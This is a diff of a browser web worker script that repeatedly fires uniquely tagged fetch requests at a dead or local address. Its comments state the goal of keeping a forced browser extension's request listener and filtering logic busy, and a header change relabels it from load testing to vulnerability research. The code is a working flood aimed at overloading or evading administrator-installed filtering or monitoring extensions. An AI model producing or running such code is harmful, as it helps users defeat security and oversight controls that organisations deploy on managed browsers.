@@ -1,27 +1,27 @@
-// worker.js - Precision Load Testing Script
+// worker.js - Precision Vulnerability Research Script
 self.onmessage = function(e) {
     if (e.data === "start") {
-        // We use a faster interval but a much smaller loop to avoid 
-        // triggering system-wide lag while keeping the extension busy.
+        // We use a small loop to ensure we aren't flooding the system bus,
+        // but we keep the extension's 'onBeforeRequest' listener occupied.
         setInterval(() => {
-            for (let i = 0; i < 4; i++) { 
-                // Using a unique ID and timestamp to bypass extension caches
+            for (let i = 0; i < 3; i++) { 
                 const testId = self.crypto.randomUUID();
-                const timestamp = Date.now();
                 
-                // A longer, more complex URL forces the extension to spend 
-                // more time running its regex/filtering patterns.
-                const testUrl = `http://10.255.255.1/auth/verify/status?session=${testId}&time=${timestamp}&check=true`;
+                // We use a specific URL structure that forced-extensions 
+                // often prioritize for deep-scanning.
+                const testUrl = `http://127.0.0.1/research?verify=${testId}&check=true`;
 
+                // 'keepalive: false' ensures we don't clog the browser's 
+                // actual network sockets, just the extension's logic.
                 fetch(testUrl, { 
                     mode: 'no-cors', 
                     cache: 'no-store',
-                    credentials: 'omit'
+                    keepalive: false 
                 }).catch(() => {
-                    // Silent catch: the IP is non-existent to keep traffic 
-                    // local and avoid hitting actual network firewalls.
+                    // This will always fail, which is good. 
+                    // It clears the memory immediately.
                 });
             }
-        }, 40); // 40ms is roughly 25 times per second
+        }, 60); // 60ms allows the UI thread to breathe while keeping the extension busy.
     }
 };
